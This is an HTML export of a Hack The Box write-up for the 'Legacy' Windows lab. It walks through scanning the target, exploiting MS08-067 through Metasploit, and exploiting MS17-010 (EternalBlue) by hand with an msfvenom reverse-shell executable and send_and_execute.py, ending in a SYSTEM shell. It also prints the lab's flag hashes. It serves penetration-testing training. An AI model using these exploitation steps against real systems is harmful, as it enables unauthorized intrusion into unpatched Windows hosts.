<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>legacy</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Windows_Boxes.html">Windows Boxes</a></p>
<p><a href="#legacy">legacy</a></p>
<ol>
<li><a href="#nmap">nmap</a></li>
<ol>
<li><a href="#nmap vuln">nmap vuln</a></li>
</ol>
<li><a href="#metasploit">metasploit</a></li>
<li><a href="#manual">manual</a></li>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="legacy"><h1><b><u>legacy</u></b></h1><img alt="images/338-1.png" src="images/338-1.png"/><br/><img alt="images/338-2.png" src="images/338-2.png"/></div>
<div class="page" id="nmap"><h1><b><u>nmap</u></b></h1><span style="color:#ffa500;">nmap -sC -sV -oA nmap/legacy 10.10.10.4</span><br/><img alt="images/339-1.png" src="images/339-1.png"/></div>
<div class="page" id="nmap vuln"><h1><b><u>nmap vuln</u></b></h1><span style="color:#ffa500;">nmap --script vulns 10.10.10.4</span><br/><img alt="images/1642-1.png" src="images/1642-1.png"/><br/><br/><span style="color:#24ff00;">nmap is showing legacy is </span><span style="color:#ffff00;">vulnerable</span><span style="color:#24ff00;"> to BOTH </span><span style="color:#ffa500;">MS08-067</span><span style="color:#24ff00;"> aka </span><span style="color:#ffa500;">netapi</span><span style="color:#24ff00;"> <br/></span><img alt="images/1642-2.png" src="images/1642-2.png"/><br/>and <span style="color:#ffa500;">ms17-010</span><span style="color:#24ff00;"> aka </span><span style="color:#ffa500;">eternal blue</span><br/><br/><span style="color:#24ff00;">both exploits are infamous as to how well they work against their targets, so its up to personal preference which one you would like to use here</span></div>
<div class="page" id="metasploit"><h1><b><u>metasploit</u></b></h1><span style="color:#ffff00;">https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi</span><br/><br/><img alt="images/1640-1.png" src="images/1640-1.png"/><br/><br/><br/><code>msf &gt; use exploit/windows/smb/ms08_067_netapi<br/>msf exploit(ms08_067_netapi) &gt; show targets<br/>    ...targets...<br/>msf exploit(ms08_067_netapi) &gt; set TARGET &lt; target-id &gt;<br/>msf exploit(ms08_067_netapi) &gt; show options<br/>    ...show and set options...<br/>msf exploit(ms08_067_netapi) &gt; exploit</code><br/><br/><img alt="images/1640-2.png" src="images/1640-2.png"/><br/><br/><span style="color:#ffa500;">search netapi</span><br/><img alt="images/1640-3.png" src="images/1640-3.png"/><br/><br/><span style="color:#ffa500;">use 3</span><br/><img alt="images/1640-4.png" src="images/1640-4.png"/><br/><img alt="images/1640-5.png" src="images/1640-5.png"/><br/><br/><span style="color:#ffa500;">show options</span><br/><img alt="images/1640-6.png" src="images/1640-6.png"/><br/><br/><span style="color:#ffa500;">rhosts</span><span style="color:#24ff00;"> is a required parameter so we'll set that with</span><br/><img alt="images/1640-7.png" src="images/1640-7.png"/><br/><br/><span style="color:#ffa500;">set rhosts 10.10.10.4</span><br/><img alt="images/1640-8.png" src="images/1640-8.png"/><br/><br/><span style="color:#24ff00;">but notice we also have to change our lport since it is </span><span style="color:#ff0000;">not using our tunnel's ip</span><br/><img alt="images/1640-9.png" src="images/1640-9.png"/><br/><span style="color:#ffa500;">set lhost tun0</span><br/><img alt="images/1640-10.png" src="images/1640-10.png"/><br/><br/><span style="color:#ffa500;">show options</span> <span style="color:#24ff00;">one more time:</span><br/><img alt="images/1640-11.png" src="images/1640-11.png"/><br/><span style="color:#24ff00;"><br/>and </span><span style="color:#ffa500;">run</span><br/><img alt="images/1640-12.png" src="images/1640-12.png"/><br/><br/>and we have a shell with <span style="color:#ffff00;">system privileges</span><span style="color:#24ff00;">!</span><br/><img alt="images/1640-13.png" src="images/1640-13.png"/><br/></div>
<div class="page" id="manual"><h1><b><u>manual</u></b></h1><span style="color:#24ff00;">for our manual exploit we're going to use </span><span style="color:#ffa500;">eternal blue</span><br/><br/><span style="color:#24ff00;">clone </span><a href="https://github.com/helviojunior/MS17-010">eternal blue repo</a> <br/><img alt="images/1643-1.png" src="images/1643-1.png"/><br/><br/><span style="color:#24ff00;">create reverse shell with msfvenom</span> <span style="color:#24ff00;">named</span><span style="color:#ffa500;"> eternal_blue.exe</span><br/><img alt="images/1643-2.png" src="images/1643-2.png"/><br/><br/><span style="color:#24ff00;">out of the following codes,</span><br/><img alt="images/1643-3.png" src="images/1643-3.png"/><br/><br/><span style="color:#24ff00;">use </span><span style="color:#ffa500;">send_and_execute.py</span><span style="color:#24ff00;"> with target IP and reverse shell code</span><br/><span style="color:#ffa500;">python send_and_execute.py 10.10.10.4 eternal_blue.exe</span><br/><img alt="images/1643-4.png" src="images/1643-4.png"/><br/><br/><span style="color:#24ff00;">we get back a shell!</span><br/><img alt="images/1643-5.png" src="images/1643-5.png"/><br/><br/><span style="color:#24ff00;">unfortunately our shell is a bit </span><span style="color:#ff0000;">limited</span><span style="color:#24ff00;"> to baseline commands such as </span><span style="color:#ffa500;">whoami</span><span style="color:#24ff00;"> but after navigating around, our owned <br/>user has </span><span style="color:#ffff00;">system</span><span style="color:#24ff00;"> privileges</span><br/><img alt="images/1643-6.png" src="images/1643-6.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/507-1.png" src="images/507-1.png"/><span style="color:#ffff00;"><br/>e69af0e4f443de7e36876fda4ec7644f<br/></span><img alt="images/507-2.png" src="images/507-2.png"/><br/>993442d258b0e0ec917cae9e695d5713</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><img alt="images/524-1.png" src="images/524-1.png"/></div>
